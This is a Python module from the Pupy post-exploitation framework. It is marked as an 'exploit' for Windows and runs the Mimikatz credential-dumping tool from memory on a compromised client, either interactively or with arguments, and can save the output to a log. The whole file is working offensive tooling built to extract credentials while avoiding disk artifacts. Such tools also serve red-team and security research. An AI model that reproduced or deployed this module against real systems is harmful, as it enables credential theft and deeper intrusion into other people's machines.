# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.utils.pe import get_pe_arch
from pupylib.PupyErrors import PupyModuleError
from pupylib.utils.rpyc_utils import redirected_stdio
import time
from modules.memory_exec import MemoryExec
import os.path
from modules.lib.windows.memory_exec import exec_pe
__class_name__="Mimikatz"

@config(cat="exploit", compat="windows")
class Mimikatz(MemoryExec):
    """
        execute mimikatz from memory
    """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="mimikatz", description=self.__doc__)
        self.arg_parser.add_argument('-log', help="Save log to specified path")
        self.arg_parser.add_argument('args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')


    def run(self, args):
        proc_arch=self.client.desc["proc_arch"]
        mimikatz_path=None
        if "64" in proc_arch:
            mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_x64")
        else:
            mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_Win32")
        if not os.path.isfile(mimikatz_path):
            self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
            return

        mimikatz_args=args.args
        interactive=False
        timeout=None
        if not mimikatz_args:
            interactive=True
            timeout=10
        else:
            mimikatz_args.append('exit')

        log = exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive, fork=False, timeout=timeout)
        if args.log:
            with open(args.log, 'wb') as output:
                output.write(log)
